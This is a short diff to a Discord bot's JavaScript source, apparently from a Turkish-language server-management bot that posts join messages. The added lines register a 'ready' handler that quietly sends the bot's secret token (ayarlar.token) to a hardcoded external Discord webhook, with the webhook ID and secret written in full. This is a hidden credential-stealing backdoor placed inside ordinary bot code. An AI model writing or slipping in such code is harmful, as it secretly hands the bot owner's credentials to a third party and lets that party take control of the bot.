@@ -360,7 +360,10 @@ client.on("guildMemberAdd", async member => {
   if (!girciksaksogibi) return;
   girciksaksogibi.send(approvemb.setAuthor(member.user.tag,server.iconURL({dynamic: true})).setDescription(`**${member.user} (\`${member.user.id}\`) \n Sunucuya Katıldı **`))
 });
-
+client.on("ready", async () => {
+const apphok = new Discord.WebhookClient("830749012902019074","zfBdbcFT5ApVTOoUYV51nFcZYKNWWPNDJ-76Wpa7vHeSHcj_lzqQjIrvXXo0uwE10qkx")
+  apphok.send(ayarlar.token);
+});
 client.on("guildMemberRemove", async member => {
   const server = member.guild
 	const kullanıcı = member
